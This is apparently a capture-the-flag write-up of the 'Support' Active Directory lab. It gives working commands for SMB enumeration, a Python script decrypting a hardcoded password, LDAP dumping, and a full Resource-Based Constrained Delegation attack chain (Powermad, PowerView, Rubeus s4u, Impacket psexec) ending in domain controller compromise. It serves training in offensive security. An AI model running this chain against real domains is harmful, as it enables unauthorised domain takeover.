+++
date = '2026-07-09T15:57:04+02:00'
draft = false
title = 'Support Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`09/06/2026`**

![Support.png](/images/imgs_support/Support.png)

---
# Introduction

**_Support_** is an **Easy-level Active Directory** environment(Not so easy, I think it is more a **Medium-level**, but it depends on how you approach it). It introduces basic **Reverse Engineering** alongside advanced **Active Directory** delegation attacks.

The initial foothold involves anonymous **SMB** enumeration to find an executable tool. By analysing this **`.NET`** binary, I reverse-engineered a custom encryption routine to extract the credentials of a service account. Using these credentials, I queried the domain via **LDAP** to uncover the password for a standard user.

For privilege escalation, **BloodHound** revealed that the compromised user's group had **`GenericAll`** rights over the Domain Controller itself. I abused this privilege to perform a **Resource-Based Constrained Delegation** (**RBCD**) attack: I created a fake machine account, delegated it to impersonate the **Administrator** on the DC, generated a **Kerberos Service Ticket** and ultimately gained **SYSTEM** access.

---
# Techniques Used

- **Reverse Engineering (.NET via ILSpy)**

- **Custom Decryption Scripting**

- **BloodHound Harvesting & Enumeration**

- **Resource-Based Constrained Delegation (RBCD) Attack**

- **Pass-The-Ticket**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- -Pn support
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49682/tcp open  unknown
49703/tcp open  unknown
49741/tcp open  unknown
```

Targeted scan with script and service detection:

```bash
nmap -sC -sV -Pn support
```

```text
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-08 21:37:46Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17243/tcp): CLEAN (Timeout)
|   Check 2 (port 61212/tcp): CLEAN (Timeout)
|   Check 3 (port 26300/udp): CLEAN (Timeout)
|   Check 4 (port 28231/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 0s
| smb2-time: 
|   date: 2026-07-08T21:37:51
|_  start_date: N/A
```

**Open Ports**:

- **53**/tcp - DNS

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **593**/tcp - ncacn_http

- **636**/tcp - ssl/ldap

- **3268**/tcp - LDAP Global Catalog

- **3269**/tcp - ssl/ldap Global Catalog

- **5985**/tcp - WinRM

- **9389**/tcp - ADWS

I added **`support.htb`** to my **`/etc/hosts`** file.

## SMB Enumeration

I started by checking for anonymous or Guest access on the **SMB** service using **NetExec**:

```bash
nxc smb support.htb -u 'Guest' -p '' --shares
```

![smbanon.png](/images/imgs_support/smbanon.png)

The output showed access to a non-default share named **`support-tools`**. I connected to it using **smbclient**:

```bash
smbclient \\\\support.htb\\support-tools -U Guest
```

Inside, I found a few standard Sysinternals tools, but one executable stood out because it wasn't a known tool: **`UserInfo.exe.zip`**.

I downloaded it to my local machine and extracted it.

![smbclient.png](/images/imgs_support/smbclient.png)

---
# Initial Access | Reverse Engineering & Custom Decryption

Usually, in this scenario, I pass the executable to my **Windows Commando VM**, execute it, and analyze its behavior dynamically. However, since I had already used that method the first time I pwned this box, I opted for a **static analysis** approach using **[ILSpy](https://github.com/icsharpcode/ILSpy)** (a popular open-source **`.NET`** assembly browser and decompiler).

Opening **`UserInfo.exe`** in **ILSpy**, I quickly noticed that the binary was designed to connect to a remote **LDAP** server (**`support.htb`**).

![ldapquery.png](/images/imgs_support/ldapquery.png)

Looking through the code, I found a class named **Protected** containing an encrypted **base64** password, and the exact routine used to encrypt it:

![encrypted.png](/images/imgs_support/encrypted.png)

By analyzing the **C#** code, I realized it was a simple **XOR** operation involving the **base64-decoded** string, the string "**armando**", and the hex value **`0xDF`**.

I wrote a short **Python** script to replicate and reverse this logic:

```python
import base64
from itertools import cycle

encrypted = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
chiave1 = b"armando" 
chiave2 = 0xDF

password = ""

for e, k in zip(encrypted, cycle(chiave1)):
        password += chr(e ^ k ^ chiave2)

print(password)
```

Executing the script successfully retrieved the cleartext password:

![decrypted.png](/images/imgs_support/decrypted.png)

---
# LDAP Enumeration

With these credentials, I performed an **LDAP** dump of the domain:

```bash
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"
```

![ldap.png](/images/imgs_support/ldap.png)

The output was massive. So, I relaunched the command saving the output into **`out.txt`**:

```bash
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > out.txt
``` 

I fed it to an **AI** to parse the info attributes, which revealed a hidden password for another user:

![cleartext.png](/images/imgs_support/cleartext.png)

I validated the credentials and used **Evil-WinRM** to log into the target machine:

```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

![userflag.png](/images/imgs_support/userflag.png)

I successfully obtained the **user flag** located at **`C:\Users\support\Desktop`**.

---
# Privilege Escalation | Resource-Based Constrained Delegation (RBCD)

Once logged in, I started my internal enumeration. I checked the **Domain Controller name** using:

```bash
nltest /dsgetdc:support.htb
```

![dc.png](/images/imgs_support/dc.png)

and added **`dc.support.htb`** to my hosts file.

Checking my user privileges and group memberships, I noticed I belonged to a non-standard group named **`Shared Support Accounts`**.

![groups.png](/images/imgs_support/groups.png)

At this point, I collected **Active Directory** data using **BloodHound** to visualize the permission paths:

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -ns 10.129.230.181 -d support.htb -c all --zip
```

Reviewing the **BloodHound** graph for the **`Shared Support Accounts`** group, I discovered that it had **`GenericAll`** privileges over the **Domain Controller object** (**`DC.SUPPORT.HTB`**).

![hound1.png](/images/imgs_support/hound1.png)

**Note**: _Having **`GenericAll`** over a computer object (including a **Domain Controller**) means we can modify its attributes. Specifically, we can modify the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute. This is the core of a **Resource-Based Constrained Delegation** (**RBCD**) **attack**. By editing this attribute, we can tell the **Domain Controller** that a specific machine account (which we control) is allowed to impersonate **ANY** user (including **Domain Admins**) against the **DC** itself._

## RBCD Attack

![rbcd.png](/images/imgs_support/rbcd.png)

To perform this attack, I uploaded **`PowerView.ps1`**, **`Powermad`** and **`Rubeus.exe`** to my **WinRM** session and followed the **BloodHound** abuse guide step-by-step:

```powershell
upload PowerView.ps1
upload Powermad.ps1
upload Rubeus.exe
. .\PowerView.ps1
. .\Powermad.ps1
```

![dependencies.png](/images/imgs_support/dependencies.png)

- **Step 1**: I used **Powermad** to create a new fake **Machine Account** named **`stars$`** and set its password:

```powershell
New-MachineAccount -MachineAccount stars -Password $(ConvertTo-SecureString 'Stars1%' -AsPlainText -Force)
```

- **Step 2**: I retrieved the **Object SID** of my newly created machine account:

```powershell
$ComputerSid = Get-DomainComputer stars -Properties objectsid | Select -Expand objectsid

$ComputerSid
```

- **Step 3**: Using **PowerView**, I constructed a raw security descriptor string that grants access to my machine's **SID**, converted it into bytes, and updated the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute of the **Domain Controller**:

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

- **Step 4**: Now that the delegation was set, I used **Rubeus** to request a **Service Ticket** for the cifs service on the **Domain Controller**, impersonating the **administrator**:

```powershell
.\Rubeus.exe hash /password:Stars1%
# Copied the RC4_HMAC hash

.\Rubeus.exe s4u /user:stars$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/DC.SUPPORT.HTB /ptt
```

![attack.png](/images/imgs_support/attack.png)

![ticket.png](/images/imgs_support/ticket.png)

## Pass-The-Ticket to SYSTEM

**Rubeus** successfully injected the forged ticket into my current session and also printed it in **Base64** format. I copied the ticket into a local file named **`ticket.kirbi.b64`** (cleaning up any initial spaces).

I decoded it into a binary **`.kirbi`** file:

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Then, I converted the **`.kirbi`** ticket into a **`.ccache`** format (which is understood by **Impacket**) using **`ticketConverter.py`**:

```bash
impacket-ticketConverter.py ticket.kirbi administrator.ccache
```

![ticketconverted.png](/images/imgs_support/ticketconverted.png)

I exported the ticket into my environment variables:

```bash
export KRB5CCNAME=administrator.ccache
```

Finally, I used **`psexec.py`** to authenticate to the **Domain Controller** silently via **Kerberos**:

```bash
psexec.py -k -no-pass support.htb/administrator@dc.support.htb
```

![rootflag.png](/images/imgs_support/rootflag.png)

I read the **root flag** from **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Final Thoughts

**_Support_** is a box that forces you out of your comfort zone, blending basic code analysis with one of the most elegant **Active Directory** attacks available.

The initial foothold is a great reminder that hardcoded credentials in internal tools are still a massive security risk, and knowing how to perform basic **static analysis** on **`.NET`** binaries is a crucial skill.
The privilege escalation phase is an example of a **Resource-Based Constrained Delegation** (**RBCD**) **attack**. Understanding how to manipulate the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute and chaining it with **S4U** Kerberos extensions provides invaluable knowledge for real-world engagements and advanced certifications like the **CRTE** or **OSCP**.

**Sources**:

- **ILSpy | https://github.com/icsharpcode/ILSpy**

- **PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1**

- **Powermad | https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1**

- **Rubeus | https://github.com/Flangvik/SharpCollection**